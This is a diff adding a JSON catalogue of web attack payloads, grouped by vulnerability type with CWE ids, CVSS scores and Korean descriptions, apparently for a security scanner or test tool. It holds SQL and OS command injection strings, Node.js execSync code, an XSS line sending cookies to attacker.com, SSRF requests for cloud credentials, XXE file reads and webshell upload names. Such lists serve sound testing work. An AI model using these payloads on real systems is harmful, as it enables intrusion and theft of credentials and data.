@@ -1,0 +1,213 @@
+{
+  "SQL_INJECTION": {
+    "name": "SQL Injection",
+    "cwe": "CWE-89",
+    "cvss": 9.8,
+    "severity": "Critical",
+    "description": "SQL 쿼리에 악의적인 코드를 삽입하여 데이터베이스를 조작하는 공격",
+    "payloads": {
+      "authBypass": [
+        "' OR '1'='1",
+        "' OR '1'='1' --",
+        "' OR '1'='1' /*",
+        "admin'--",
+        "') OR ('1'='1"
+      ],
+      "unionBased": [
+        "' UNION SELECT NULL--",
+        "' UNION SELECT NULL, NULL--",
+        "' UNION SELECT username, password FROM users--"
+      ],
+      "timeBased": [
+        "' AND SLEEP(5)--",
+        "'; WAITFOR DELAY '0:0:5'--"
+      ],
+      "errorBased": [
+        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--"
+      ]
+    }
+  },
+  "OS_COMMAND_INJECTION": {
+    "name": "OS Command Injection",
+    "cwe": "CWE-78",
+    "cvss": 9.8,
+    "severity": "Critical",
+    "description": "운영체제 명령어를 삽입하여 서버에서 임의 명령을 실행하는 공격",
+    "payloads": {
+      "basic": [
+        "; ls -la",
+        "| cat /etc/passwd",
+        "`whoami`",
+        "$(id)",
+        "& dir"
+      ],
+      "encoded": [
+        "%3Bls",
+        "%7Ccat%20/etc/passwd",
+        "${IFS}ls"
+      ],
+      "timeBased": [
+        "; sleep 5",
+        "| sleep 5",
+        "$(sleep 5)"
+      ]
+    }
+  },
+  "CODE_INJECTION": {
+    "name": "Code Injection (eval)",
+    "cwe": "CWE-94",
+    "cvss": 9.8,
+    "severity": "Critical",
+    "description": "eval() 등을 통해 서버에서 임의 코드를 실행하는 공격",
+    "payloads": {
+      "nodeJs": [
+        "require(\"child_process\").execSync(\"whoami\").toString()",
+        "process.mainModule.require(\"child_process\").execSync(\"id\")",
+        "global.process.mainModule.require(\"fs\").readFileSync(\"/etc/passwd\")"
+      ],
+      "functionConstructor": [
+        "new Function(\"return process.env\")()",
+        "[].constructor.constructor(\"return process.env\")()"
+      ]
+    }
+  },
+  "XSS_ATTACK": {
+    "name": "Cross-Site Scripting (XSS)",
+    "cwe": "CWE-79",
+    "cvss": 7.1,
+    "severity": "High",
+    "description": "악성 스크립트를 삽입하여 사용자 브라우저에서 실행시키는 공격",
+    "payloads": {
+      "reflected": [
+        "<script>alert(\"XSS\")</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>"
+      ],
+      "stored": [
+        "<script>fetch(\"http://attacker.com/?c=\"+document.cookie)</script>"
+      ],
+      "domBased": [
+        "javascript:alert(document.cookie)",
+        "#<script>alert(1)</script>"
+      ],
+      "filterBypass": [
+        "<scr<script>ipt>alert(1)</scr</script>ipt>",
+        "<svg/onload=alert(1)>",
+        "\"><script>alert(1)</script>"
+      ]
+    }
+  },
+  "SSRF_ATTACK": {
+    "name": "Server-Side Request Forgery (SSRF)",
+    "cwe": "CWE-918",
+    "cvss": 9.1,
+    "severity": "Critical",
+    "description": "서버가 내부 리소스나 외부 서비스에 요청하도록 조작하는 공격",
+    "payloads": {
+      "internalNetwork": [
+        "http://127.0.0.1",
+        "http://localhost:22",
+        "http://192.168.1.1",
+        "http://10.0.0.1"
+      ],
+      "cloudMetadata": [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      ],
+      "protocolHandlers": [
+        "file:///etc/passwd",
+        "dict://127.0.0.1:11211/stats",
+        "gopher://127.0.0.1:6379/_INFO"
+      ]
+    }
+  },
+  "PATH_TRAVERSAL": {
+    "name": "Path Traversal",
+    "cwe": "CWE-22",
+    "cvss": 7.5,
+    "severity": "High",
+    "description": "파일 경로를 조작하여 허용되지 않은 파일에 접근하는 공격",
+    "payloads": {
+      "basic": [
+        "../../../etc/passwd",
+        "..\\\\..\\\\..\\\\windows\\\\win.ini",
+        "....//....//....//etc/passwd"
+      ],
+      "encoded": [
+        "..%2f..%2f..%2fetc/passwd",
+        "..%252f..%252f..%252fetc/passwd",
+        "%2e%2e%2f%2e%2e%2fetc/passwd"
+      ],
+      "nullByte": [
+        "../../../etc/passwd%00.jpg",
+        "../../../etc/passwd\\x00.png"
+      ]
+    }
+  },
+  "DESERIALIZATION_ATTACK": {
+    "name": "Insecure Deserialization",
+    "cwe": "CWE-502",
+    "cvss": 9.8,
+    "severity": "Critical",
+    "description": "신뢰할 수 없는 데이터의 역직렬화로 인한 원격 코드 실행 공격",
+    "payloads": {
+      "nodeSerialize": [
+        "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()\"}"
+      ],
+      "prototypePollution": [
+        "{\"__proto__\":{\"isAdmin\":true}}",
+        "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}"
+      ]
+    }
+  },
+  "XXE_ATTACK": {
+    "name": "XML External Entity (XXE)",
+    "cwe": "CWE-611",
+    "cvss": 7.5,
+    "severity": "High",
+    "description": "XML 외부 엔티티를 통해 파일 읽기, SSRF 등을 수행하는 공격",
+    "payloads": {
+      "fileRead": [
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+      ],
+      "ssrf": [
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>"
+      ]
+    }
+  },
+  "CSRF_ATTACK": {
+    "name": "Cross-Site Request Forgery (CSRF)",
+    "cwe": "CWE-352",
+    "cvss": 8.0,
+    "severity": "High",
+    "description": "사용자가 의도하지 않은 요청을 실행하도록 유도하는 공격",
+    "payloads": {
+      "formBased": [
+        "<form action=\"TARGET\" method=\"POST\"><input name=\"amount\" value=\"10000\"/></form><script>document.forms[0].submit()</script>"
+      ],
+      "imgBased": [
+        "<img src=\"TARGET?action=delete&id=1\" />"
+      ]
+    }
+  },
+  "FILE_UPLOAD_ATTACK": {
+    "name": "Unrestricted File Upload",
+    "cwe": "CWE-434",
+    "cvss": 9.8,
+    "severity": "Critical",
+    "description": "위험한 파일 업로드를 통해 웹쉘 등을 실행하는 공격",
+    "payloads": {
+      "webshellNames": [
+        "shell.php",
+        "shell.php.jpg",
+        "shell.pHp",
+        "shell.php5",
+        ".htaccess"
+      ],
+      "contentTypeBypass": [
+        { "filename": "shell.php", "contentType": "image/jpeg" },
+        { "filename": "shell.php", "contentType": "image/gif" }
+      ]
+    }
+  }
+}
